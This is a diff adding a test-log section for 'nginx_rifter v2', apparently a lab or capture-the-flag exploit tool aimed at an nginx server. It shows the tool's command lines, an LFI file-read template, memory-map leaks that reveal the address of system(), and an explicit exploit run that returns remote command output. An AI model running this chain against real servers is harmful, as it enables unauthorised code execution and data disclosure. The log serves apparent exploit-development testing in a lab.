@@ -818,6 +818,78 @@ run artifact: artifacts/demo_v1_9_20260515-060834.json
 
 Status: pass.
 
+## nginx_rifter v2 Assessment And Explicit Exploit Handoff
+
+Purpose: verify the new assessment-first tool behaves like a real target profiler by default, uses the modular file-read vector, discovers nginx config candidates, and only runs the crashing exploit path when `--exploit` is explicit.
+
+Default assessment command:
+
+```bash
+./nginx_rifter.py \
+  --target 192.168.1.205:19321 \
+  --artifact-dir artifacts --no-color \
+  --output artifacts/nginx_rifter_20260515-v2-final.json
+```
+
+Observed:
+
+```text
+HTTP: 200 OK
+Server: nginx/1.31.0
+HTTP/2 cleartext: yes
+small text read: True
+binary read: True
+ranged reads: True
+/proc/self/status: True
+/proc/self/maps: True
+worker maps: readable
+system(): 0x7fca47abdd70
+rewrite/set candidates: 1
+verdict: ready-with-lab-like-core-leak
+```
+
+Template-backed assessment command:
+
+```bash
+./nginx_rifter.py \
+  --target 192.168.1.205:19321 \
+  --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}' \
+  --artifact-dir artifacts --no-color \
+  --output artifacts/nginx_rifter_20260515-v2-template.json
+```
+
+Observed: same assessment verdict and vulnerable route candidate using the template adapter.
+
+Explicit exploit handoff command:
+
+```bash
+./nginx_rifter.py \
+  --target 192.168.1.205:19321 \
+  --artifact-dir artifacts --no-color \
+  --exploit --cmd id --fast --exploit-rounds 1 --phpinfo-path ''
+```
+
+Observed:
+
+```text
+Explicit Exploit Handoff -> demo_ctf_exploit_v1_9.py
+CTF WIN: marker token was read back through LFI
+winning address: 0x55e4210b2127
+winning body offset: 1376
+command output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+```
+
+Artifacts:
+
+```text
+artifacts/nginx_rifter_20260515-v2-final.json
+artifacts/nginx_rifter_20260515-v2-template.json
+artifacts/nginx_rifter_20260515-063534.json
+artifacts/demo_v1_9_20260515-063534.json
+```
+
+Status: pass.
+
 ## Demo Artifact Summarizer
 
 Purpose: summarize multiple demo artifacts and surface success/negative-pass status, reset-core PID matches, candidate counts, winning addresses, and command modes.
